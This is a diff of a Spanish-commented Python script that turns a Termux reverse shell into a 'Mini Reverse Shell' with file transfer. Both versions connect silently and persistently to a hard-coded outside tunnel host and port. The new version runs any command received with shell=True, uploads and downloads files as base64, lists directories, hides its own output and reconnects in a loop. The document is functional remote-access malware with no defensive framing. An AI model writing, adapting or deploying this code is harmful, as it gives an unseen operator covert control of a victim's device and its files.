@@ -1,150 +1,280 @@
 #!/usr/bin/env python3
 """
-REVERSE SHELL TERMUX - SILENCIOSO Y PERSISTENTE
+🔥 MINI-REVERSE SHELL CON FUNCIONES BÁSICAS
+✅ Ejecutar comandos
+✅ Transferir archivos (upload/download)
+✅ Navegación de archivos
+✅ Silencioso y persistente
 """
 
 import socket
-import subprocess
 import os
 import sys
 import time
-import signal
-import pty
-import select
-import fcntl
-import termios
-import struct
+import json
+import base64
+import shlex
+from pathlib import Path
 
 # ===== CONFIGURACIÓN =====
 HOST = "Astrazam-37147.portmap.host"
 PORT = 37147
 # =========================
 
-def set_nonblocking(fd):
-    """Configurar file descriptor como no bloqueante"""
-    try:
-        fl = fcntl.fcntl(fd, fcntl.F_GETFL)
-        fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
-    except:
-        pass
-
-def get_shell_path():
-    """Obtener la ruta del shell para Termux"""
-    if os.path.exists('/data/data/com.termux'):
-        return "/data/data/com.termux/files/usr/bin/bash"
-    return "/bin/bash"
-
-def spawn_shell(sock):
-    """Crear shell interactiva con PTY"""
-    try:
-        # Crear PTY maestro/esclavo
-        master, slave = pty.openpty()
+class MiniReverseShell:
+    def __init__(self, sock):
+        self.sock = sock
+        self.cwd = os.getcwd()
+        self.home = os.path.expanduser("~")
         
-        # Configurar terminal
-        attrs = termios.tcgetattr(slave)
-        attrs[3] = attrs[3] & ~termios.ECHO  # Sin eco
-        termios.tcsetattr(slave, termios.TCSANOW, attrs)
+    def send_prompt(self):
+        """Enviar prompt con directorio actual"""
+        rel_path = os.path.relpath(self.cwd, self.home)
+        if rel_path.startswith(".."):
+            display_path = self.cwd
+        else:
+            display_path = f"~/{rel_path}" if rel_path != "." else "~"
         
-        # Obtener shell
-        shell = get_shell_path()
-        shell_cmd = [shell, "-i"]
-        
-        # Fork para ejecutar shell
-        pid = os.fork()
-        
-        if pid == 0:  # Proceso hijo
-            # Cerrar el maestro
-            os.close(master)
+        prompt = f"\033[1;32m{os.getlogin()}@mini-shell\033[0m:\033[1;34m{display_path}\033[0m$ "
+        self.sock.send(prompt.encode())
+    
+    def exec_command(self, cmd):
+        """Ejecutar comando normal"""
+        try:
+            import subprocess
+            result = subprocess.run(
+                cmd,
+                shell=True,
+                cwd=self.cwd,
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            output = result.stdout + result.stderr
+            return output if output else "[Comando ejecutado]\n"
+        except Exception as e:
+            return f"[Error] {str(e)}\n"
+    
+    def change_dir(self, path):
+        """Cambiar directorio"""
+        try:
+            # Expandir ~
+            if path.startswith("~"):
+                path = os.path.expanduser(path)
             
-            # Hacer el esclavo nuestro terminal controlador
-            os.dup2(slave, 0)
-            os.dup2(slave, 1)
-            os.dup2(slave, 2)
+            # Si es ruta relativa, hacerla absoluta respecto a cwd
+            if not os.path.isabs(path):
+                path = os.path.join(self.cwd, path)
             
-            # Configurar grupo de procesos
-            os.setsid()
-            os.tcsetpgrp(slave, os.getpgid(0))
+            os.chdir(path)
+            self.cwd = os.getcwd()
+            return f"[OK] Directorio: {self.cwd}\n"
+        except Exception as e:
+            return f"[Error] {str(e)}\n"
+    
+    def list_files(self, path="."):
+        """Listar archivos con detalles"""
+        try:
+            target = os.path.join(self.cwd, path) if path != "." else self.cwd
+            files = []
             
-            # Variables de entorno para terminal
-            os.environ['TERM'] = 'xterm-256color'
-            os.environ['COLORTERM'] = 'truecolor'
-            
-            # Ejecutar shell
-            os.execvp(shell, shell_cmd)
-            
-        else:  # Proceso padre
-            os.close(slave)
-            
-            # Configurar no bloqueante
-            set_nonblocking(master)
-            set_nonblocking(sock)
-            
-            # Bucle de transferencia de datos
-            while True:
-                try:
-                    rlist, _, _ = select.select([master, sock], [], [], 1)
+            with os.scandir(target) as entries:
+                for entry in entries:
+                    stat = entry.stat()
+                    perms = oct(stat.st_mode)[-3:]
+                    size = self.human_size(stat.st_size)
+                    time_str = time.strftime('%Y-%m-%d %H:%M', 
+                                           time.localtime(stat.st_mtime))
                     
-                    for r in rlist:
-                        if r == master:
-                            data = os.read(master, 1024)
-                            if data:
-                                sock.sendall(data)
-                        elif r == sock:
-                            data = sock.recv(1024)
-                            if data:
-                                os.write(master, data)
-                            else:
-                                # Conexión cerrada
-                                os.kill(pid, 9)
-                                return False
-                                
-                except (OSError, socket.error):
-                    continue
-                except Exception:
+                    icon = "📁" if entry.is_dir() else "📄"
+                    files.append(f"{icon} {perms} {size:>8} {time_str} {entry.name}")
+            
+            return "\n".join(files) + "\n" if files else "[Vacío]\n"
+        except Exception as e:
+            return f"[Error] {str(e)}\n"
+    
+    def human_size(self, size):
+        """Convertir tamaño a formato legible"""
+        for unit in ['B', 'KB', 'MB', 'GB']:
+            if size < 1024.0 or unit == 'GB':
+                break
+            size /= 1024.0
+        return f"{size:.1f}{unit}"
+    
+    def upload_file(self, remote_path, content_b64):
+        """Subir archivo al servidor"""
+        try:
+            content = base64.b64decode(content_b64.encode())
+            
+            # Asegurar ruta absoluta
+            if not os.path.isabs(remote_path):
+                remote_path = os.path.join(self.cwd, remote_path)
+            
+            # Crear directorios si no existen
+            os.makedirs(os.path.dirname(remote_path), exist_ok=True)
+            
+            with open(remote_path, 'wb') as f:
+                f.write(content)
+            
+            size = self.human_size(len(content))
+            return f"[OK] Archivo guardado: {remote_path} ({size})\n"
+        except Exception as e:
+            return f"[Error] {str(e)}\n"
+    
+    def download_file(self, file_path):
+        """Descargar archivo del servidor"""
+        try:
+            if not os.path.isabs(file_path):
+                file_path = os.path.join(self.cwd, file_path)
+            
+            if not os.path.exists(file_path):
+                return None, "[Error] Archivo no encontrado\n"
+            
+            with open(file_path, 'rb') as f:
+                content = f.read()
+            
+            b64_content = base64.b64encode(content).decode()
+            filename = os.path.basename(file_path)
+            size = self.human_size(len(content))
+            
+            return b64_content, f"[OK] {filename} ({size})\n"
+        except Exception as e:
+            return None, f"[Error] {str(e)}\n"
+    
+    def get_file_info(self, path):
+        """Obtener información de archivo"""
+        try:
+            if not os.path.isabs(path):
+                path = os.path.join(self.cwd, path)
+            
+            stat = os.stat(path)
+            info = {
+                'name': os.path.basename(path),
+                'path': path,
+                'size': self.human_size(stat.st_size),
+                'modified': time.ctime(stat.st_mtime),
+                'permissions': oct(stat.st_mode)[-3:],
+                'is_dir': os.path.isdir(path)
+            }
+            
+            result = f"📊 Información de {info['name']}:\n"
+            for key, value in info.items():
+                result += f"  {key}: {value}\n"
+            return result
+        except Exception as e:
+            return f"[Error] {str(e)}\n"
+    
+    def process_command(self, cmd_line):
+        """Procesar línea de comando"""
+        cmd_line = cmd_line.strip()
+        if not cmd_line:
+            return ""
+        
+        # Comandos especiales
+        if cmd_line.lower() in ['exit', 'quit']:
+            return None
+        
+        # CD - Cambiar directorio
+        if cmd_line.startswith('cd '):
+            return self.change_dir(cmd_line[3:])
+        
+        # LS - Listar archivos
+        if cmd_line.startswith('ls'):
+            args = cmd_line[2:].strip()
+            return self.list_files(args if args else ".")
+        
+        # PWD - Mostrar directorio actual
+        if cmd_line == 'pwd':
+            return f"{self.cwd}\n"
+        
+        # UPLOAD - Subir archivo
+        if cmd_line.startswith('upload '):
+            parts = cmd_line[7:].split(' ', 1)
+            if len(parts) != 2:
+                return "[Error] Formato: upload <ruta_remota> <contenido_base64>\n"
+            return self.upload_file(parts[0], parts[1])
+        
+        # DOWNLOAD - Descargar archivo
+        if cmd_line.startswith('download '):
+            file_path = cmd_line[9:].strip()
+            content, msg = self.download_file(file_path)
+            if content:
+                # Enviar archivo en formato especial
+                self.sock.send(f"[FILE_START]{file_path}[SEP]{content}[FILE_END]".encode())
+                return msg
+            return msg
+        
+        # INFO - Información de archivo
+        if cmd_line.startswith('info '):
+            return self.get_file_info(cmd_line[5:])
+        
+        # Comando normal del sistema
+        return self.exec_command(cmd_line)
+    
+    def run(self):
+        """Ejecutar shell"""
+        welcome = f"""
+╔══════════════════════════════════╗
+║   MINI REVERSE SHELL v1.0        ║
+╠══════════════════════════════════╣
+║ • Comandos: ls, cd, pwd, info    ║
+║ • Upload: upload ruta base64     ║
+║ • Download: download ruta        ║
+║ • Salir: exit                    ║
+╚══════════════════════════════════╝
+Directorio actual: {self.cwd}
+        """
+        self.sock.send(welcome.encode())
+        
+        while True:
+            try:
+                self.send_prompt()
+                data = self.sock.recv(8192).decode().strip()
+                
+                if not data:
                     break
+                
+                result = self.process_command(data)
+                
+                if result is None:  # Comando exit
+                    self.sock.send(b"\n[+] Saliendo...\n")
+                    break
+                
+                if result:  # Solo enviar si hay resultado
+                    self.sock.send(result.encode())
                     
-            return True
-            
-    except Exception:
-        return False
+            except Exception as e:
+                self.sock.send(f"[Error interno] {str(e)}\n".encode())
+                continue
 
 def main():
-    """Función principal con reconexión automática"""
-    # Ignorar señales
-    signal.signal(signal.SIGINT, signal.SIG_IGN)
-    signal.signal(signal.SIGTERM, signal.SIG_IGN)
-    signal.signal(signal.SIGHUP, signal.SIG_IGN)
+    """Función principal con reconexión"""
+    # Silenciar
+    sys.stdout = sys.stderr = open(os.devnull, 'w')
     
-    # Redirigir salidas a /dev/null para silencio
-    devnull = open(os.devnull, 'w')
-    sys.stdout = devnull
-    sys.stderr = devnull
-    
-    print("[+] Reverse Shell iniciado (silencioso)")
+    print("[+] Mini Reverse Shell iniciado")
     
     while True:
         try:
-            # Crear socket
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock = socket.socket()
             sock.settimeout(10)
-            
-            # Conectar
             sock.connect((HOST, PORT))
             sock.settimeout(None)
             
-            # Lanzar shell interactiva
-            spawn_shell(sock)
+            print(f"[+] Conectado a {HOST}:{PORT}")
             
-            # Si llegamos aquí, la shell terminó
+            shell = MiniReverseShell(sock)
+            shell.run()
+            
             sock.close()
+            print("[-] Conexión cerrada, reconectando...")
             time.sleep(3)
             
-        except socket.timeout:
-            time.sleep(5)
-        except ConnectionRefusedError:
-            time.sleep(10)
-        except Exception:
+        except KeyboardInterrupt:
+            print("\n[!] Interrumpido")
+            break
+        except Exception as e:
+            print(f"[-] Error: {e}, reconectando...")
             time.sleep(5)
 
 if __name__ == "__main__":
